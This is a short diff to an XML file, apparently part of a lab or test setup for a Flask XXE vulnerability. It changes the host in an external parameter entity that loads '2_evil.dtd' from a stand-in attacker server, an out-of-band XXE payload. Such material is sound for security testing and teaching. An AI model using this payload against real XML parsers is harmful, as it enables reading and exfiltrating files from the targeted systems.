@@ -2,7 +2,7 @@
 
 <!DOCTYPE Company
 [
- <!ENTITY % aaa SYSTEM "http://attackerserver:8888/2_evil.dtd" > %aaa;
+ <!ENTITY % aaa SYSTEM "http://attackerserver-flaskxxe:8888/2_evil.dtd" > %aaa;
 ]>
 
 <Company>
